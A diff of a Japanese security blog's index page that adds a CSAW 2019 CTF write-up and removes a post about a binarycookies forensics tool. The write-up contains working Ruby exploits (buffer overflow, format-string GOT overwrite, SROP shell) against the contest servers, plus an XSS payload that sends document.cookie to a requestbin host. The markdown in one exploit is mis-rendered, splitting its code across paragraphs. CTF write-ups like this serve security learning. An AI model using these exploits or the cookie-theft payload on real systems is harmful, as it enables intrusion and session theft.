@@ -106,6 +106,228 @@
 <article>
   <header class="Heading">
   <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/csaw2019/" rel="bookmark">Csaw2019 writeup</a>
+  </h2>
+  
+  <time datetime="2019-09-16T09:50:28&#43;09:00">
+    16 September, 2019
+  </time>
+  
+</header>
+  
+
+<h2 id="misc">Misc</h2>
+
+<h3 id="mcgriddlev2">mcgriddlev2</h3>
+
+<ul>
+<li>問題文にFLAGが記載されている</li>
+<li><strong>flag{W3lcome_7o_CSAW_QUALS_2019!}</strong></li>
+</ul>
+
+<h2 id="pwn">Pwn</h2>
+
+<h3 id="baby-boi-50pt">baby_boi (50pt)</h3>
+
+<ul>
+<li>シンプルなBOFでIPが奪える問題</li>
+
+<li><p>libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
+<span style="color:#408080;font-style:italic"># coding: ascii-8bit</span>
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
+$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;localhost&#34;</span>, <span style="color:#666">8888</span>
+$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#666">1005</span>
+libc <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./libc-2.27.so&#34;</span>
+<span style="color:#408080;font-style:italic">#libc = ELF.new &#34;/lib/x86_64-linux-gnu/libc-2.29.so&#34;</span>
+<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">z</span>; $z; <span style="color:#008000;font-weight:bold">end</span>
+z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>)
+libc_printf <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>)<span style="color:#666">.</span>match(<span style="color:#b68">/: (.+)/</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>to_i(<span style="color:#666">16</span>)
+libc_base <span style="color:#666">=</span> libc_printf <span style="color:#666">-</span> libc<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#34;printf&#34;</span><span style="color:#666">]</span>
+<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;%x&#34;</span> <span style="color:#008000">% libc_base
+</span><span style="color:#008000">payload </span> <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(libc_base <span style="color:#666">+</span> <span style="color:#666">0x4f322</span>)
+z<span style="color:#666">.</span>sendline(payload)
+z<span style="color:#666">.</span>interact</code></pre></div></li>
+
+<li><p><strong>flag{baby_boi_dodooo_doo_doo_dooo}</strong></p></li>
+</ul>
+
+<h3 id="got-milk-50pt">GOT Milk? (50pt)</h3>
+
+<ul>
+<li>独自の共有オブジェクトとバイナリが配られる</li>
+<li><code>set LD_LIBRARY_PATH ./</code> でカレントディレクトリの共有オブジェクトを見るようにする</li>
+
+<li><p>FSBがあるので、それを使ってGOT Overwriteする</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
+<span style="color:#408080;font-style:italic"># coding: ascii-8bit</span>
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;fsa&#39;</span>
+<span style="color:#408080;font-style:italic">#$z = Sock.new &#34;localhost&#34;, 8888</span>
+$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#666">1004</span>
+<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">z</span>; $z; <span style="color:#008000;font-weight:bold">end</span>
+value <span style="color:#666">=</span> <span style="color:#666">0x89</span>
+fmt <span style="color:#666">=</span> <span style="color:#800">FSA</span><span style="color:#666">.</span>new()
+fmt<span style="color:#666">[</span><span style="color:#666">0x804a010</span><span style="color:#666">]</span> <span style="color:#666">=</span> value
+payload <span style="color:#666">=</span> fmt<span style="color:#666">.</span>payload(<span style="color:#666">7</span>) <span style="color:#408080;font-style:italic"># index of argument</span>
+<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;? &#34;</span>)
+z<span style="color:#666">.</span>sendline(payload)
+<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recv</code></pre></div></li>
+
+<li><p><strong>flag{y0u_g00000t_mi1k_4_M3!?}</strong></p></li>
+</ul>
+
+<h3 id="small-boi-100pt">small_boi (100pt)</h3>
+
+<ul>
+<li>statically linked でstrippedな小さなバイナリが与えられる</li>
+
+<li><p>sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> を実行する</p>
+
+<ul>
+<li>SROPは、スタックの値を使ってsig_return実行時にレジスタの値を代入する攻撃</li>
+
+<li><p>これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
+<span style="color:#408080;font-style:italic"># coding: ascii-8bit</span>
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
+<span style="color:#408080;font-style:italic">#$z = Sock.new &#34;localhost&#34;, 8888</span>
+$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#666">1002</span>
+<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">z</span>; $z; <span style="color:#008000;font-weight:bold">end</span>
+payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\x00</span><span style="color:#ba2121">&#34;</span> <span style="color:#666">*</span> <span style="color:#666">0x28</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x40017c</span>)
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#666">*</span> <span style="color:#666">4</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#666">*</span> <span style="color:#666">8</span> <span style="color:#408080;font-style:italic"># r8~r15</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x4001ca</span>) <span style="color:#408080;font-style:italic"># rdi = /bin/sh</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># rsi</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># rbp</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># </span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># </span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x3b</span>) <span style="color:#408080;font-style:italic"># rax = 0x3b </span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># rcx</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>)   <span style="color:#408080;font-style:italic"># rsp</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x00400185</span>) <span style="color:#408080;font-style:italic"># rip = syscall</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#408080;font-style:italic"># eflags</span>
+payload <span style="color:#666">&lt;&lt;</span> p16(<span style="color:#666">0x33</span>) <span style="color:#408080;font-style:italic"># cs</span>
+payload <span style="color:#666">&lt;&lt;</span> p16(<span style="color:#666">0</span>)
+payload <span style="color:#666">&lt;&lt;</span> p16(<span style="color:#666">0</span>)
+payload <span style="color:#666">&lt;&lt;</span> p16(<span style="color:#666">0x2b</span>) <span style="color:#408080;font-style:italic"># ss</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#666">*</span> <span style="color:#666">5</span> <span style="color:#408080;font-style:italic"># err ~ union</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#666">*</span> <span style="color:#666">8</span> <span style="color:#408080;font-style:italic"># reserved[8]</span>
+z<span style="color:#666">.</span>sendline payload
+z<span style="color:#666">.</span>interact</code></pre></div></li>
+</ul></li>
+
+<li><p><strong>flag{sigrop_pop_pop_pop}</strong></p></li>
+</ul>
+
+<h3 id="traveller">traveller</h3>
+
+<ul>
+<li>解けなかったのでwriteupを見た</li>
+<li>Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題</li>
+
+<li><p>編集コマンドで、<code>-50</code> をするとfree@gotを書き換えられたのでこれを使って<code>cat_flag</code>関数に飛ばす
+```ruby
+#!/usr/bin/env ruby</p>
+
+<h1 id="coding-ascii-8bit">coding: ascii-8bit</h1>
+
+<p>require &lsquo;pwn&rsquo;</p></li>
+</ul>
+
+<p>$z = Sock.new &ldquo;pwn.chal.csaw.io&rdquo;, 1003
+#elf = ELF.new &ldquo;./traveller&rdquo;
+#libc = ELF.new &ldquo;./libc-2.23.so&rdquo;</p>
+
+<p>context.log_level = :debug
+def z; $z; end</p>
+
+<p>def add(dist, dest)
+  z.sendline &ldquo;1&rdquo;
+  z.recvuntil &ldquo;&gt; &ldquo;
+  z.sendline dist.to_s
+  z.recvuntil &ldquo;: &ldquo;
+  z.sendline dest
+  z.recvuntil &ldquo;&gt; &ldquo;
+end</p>
+
+<p>def change(dist, dest)
+  z.sendline &ldquo;2&rdquo;
+  z.recvuntil &ldquo;: &ldquo;
+  z.sendline dist.to_s
+  z.send dest
+  z.recvuntil &ldquo;&gt; &ldquo;
+end</p>
+
+<p>def delete(dist)
+  z.sendline &ldquo;3&rdquo;
+  z.recvuntil &ldquo;: &ldquo;
+  z.sendline dist.to_s
+  z.recvuntil &ldquo;&gt; &ldquo;
+end</p>
+
+<p>def check(dist)
+  z.sendline &ldquo;4&rdquo;
+  z.recvuntil &ldquo;&gt;&rdquo;
+  z.sendline dist.to_s
+  return z.recvuntil &ldquo;&gt; &ldquo;
+end</p>
+
+<p>tmp = z.recvuntil &ldquo;&gt; &ldquo;
+stack_address = tmp.match(/.\n(.*) \n\n/)[1].to_i(16)</p>
+
+<p>add(1, &ldquo;AAAAAAAA&rdquo;)
+change(-50, p64(0x4008b6))
+puts delete(0)</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">- **flag{h0pe_y0u_3nj0y_ur_j0urn3y}**
+
+## Rev
+
+### Beleaf
+
+- バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する
+```ruby
+#!/usr/bin/env ruby
+
+idxs = [0x1, 0x9, 0x11, 0x27, 0x02, 0x00, 0x12, 0x03, 0x8, 0x12, 0x9, 0x12, 0x11, 0x1, 0x3, 0x13, 0x4, 0x3, 0x5, 0x15, 0x2e, 0xa, 0x3, 0xa, 0x12, 0x3, 0x1, 0x2e, 0x16, 0x2e, 0xa, 0x12, 0x6]
+
+flag = [0x77, 0x66, 0x7b, 0x5f, 0x6e, 0x79, 0x7d, 0x20, 0x62, 0x6c, 0x72, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x61, 0x65, 0x69, 0x20, 0x6f, 0x74, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x67, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75].map(&amp;:chr)
+
+idxs.each do |i|
+  print flag[i]
+end</pre></div>
+<ul>
+<li><strong>flag{we_beleaf_in_your_re_future}</strong></li>
+</ul>
+
+<h2 id="web">Web</h2>
+
+<h3 id="baby-csp">baby csp</h3>
+
+<ul>
+<li>CSPが有効なXSS問題
+
+<ul>
+<li><code>default-src 'self'; script-src 'self' *.google.com; connect-src *</code></li>
+</ul></li>
+<li>上記のCSPからJSONPエンドポイントでのXSSを使う
+
+<ul>
+<li><a href="https://inside.pixiv.blog/kobo/5137">https://inside.pixiv.blog/kobo/5137</a></li>
+</ul></li>
+<li>FLAGは、Cookieにあるので、requestbin を使ってPOSTさせるJavaScriptを埋め込む</li>
+<li><code>&lt;script src=&quot;https://accounts.google.com/o/oauth2/revoke?callback=navigator.sendBeacon('http://requestbin.net/r/ugix54ug', document.cookie)&quot;&gt;&lt;/script&gt;</code></li>
+<li><strong>flag{csp_will_solve_EVERYTHING}</strong></li>
+</ul>
+
+  
+</article>
+
+<article>
+  <header class="Heading">
+  <h2 class="Heading-title">
     <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/harekazectf2019/" rel="bookmark">HarekazeCTF 2019 writeup</a>
   </h2>
   
@@ -1248,63 +1470,6 @@ highlight_file(<span style="color:#ba2121">&#39;index.php&#39;</span>);
 </ul>
 
   
-</article>
-
-<article>
-  <header class="Heading">
-  <h2 class="Heading-title">
-    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/analyzing_binary_cookie/" rel="bookmark">binarycookiesファイル解析ツールbincookie</a>
-  </h2>
-  
-  <time datetime="2019-03-06T23:10:49&#43;09:00">
-    6 March, 2019
-  </time>
-  
-</header>
-  
-
-<h2 id="はじめに">はじめに</h2>
-
-<p>iOSやMacのフォレンジックでは、アーティファクトの1つとしてCookie情報を利用します。macOSでは、<code>/User/ユーザ名/Library/Cookies/Cookies.binarycookies</code> に存在します。しかしながら、本ファイルは拡張子からもわかるようにバイナリ形式になっています。そこで、本記事ではこのバイナリファイルを解析するツールをご紹介します。</p>
-
-<h2 id="bincookie">bincookie</h2>
-
-<p><a href="https://github.com/owlinux1000/bincookie">bincookie</a><br />
-拙作のGolangで実装された解析ツールです。goユーザなら<code>go get</code>で入りますし、Releaseからバイナリのダウンロードもできます。<br />
-本ツールの特徴として、<code>curl</code>コマンドで利用できる形式として出力する点です。私の手元にあった<code>/Users/ユーザ名/Library/Cookies/com.apple.iTunes.binarycookies</code>に対して適用した例が以下です。</p>
-<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ bincookie /Users/ユーザ名/Library/Cookies/com.apple.iTunes.binarycookies
-# Netscape HTTP Cookie File
-# This file was generated by owlinux1000&#39;s bincookie
-# https://github.com/owlinux1000/bincookie
-
-.apple.com	TRUE	/	TRUE	1566914111	xp_ci	hogehogehoge
-.apple.com	TRUE	/	TRUE	1566914111	xp_ab	hogehogehoge
-.xp.apple.com	TRUE	/	TRUE	1566914111	xp_aci	hogehogehog</pre></div>
-<p>また、同様のソフトウェアとして以下の2つが存在します。</p>
-
-<ul>
-<li><a href="https://github.com/as0ler/BinaryCookieReader">BinaryCookieReader</a></li>
-<li><a href="https://github.com/horrorho/burnt-cookie">Burnt Cookie</a></li>
-</ul>
-
-<h2 id="おわりに">おわりに</h2>
-
-<p>binarycookiesファイル解析ツールbincookieの宣伝をしました。binarycookiesファイルを解析する際には、ぜひbincookie使ってみてください。バグか何かあったらissueやPR待ってます。</p>
-
-  
-<footer>
-  <ul class="Tags">
-    
-    
-    
-    <li class="Tags-item u-background">
-      <a class="Tags-link u-clickable" href="https://owlinux1000.github.io/blog/tags/mobile/" rel="tag">mobile</a>
-    </li>
-    
-    
-  </ul>
-</footer>
-
 </article>
 
 
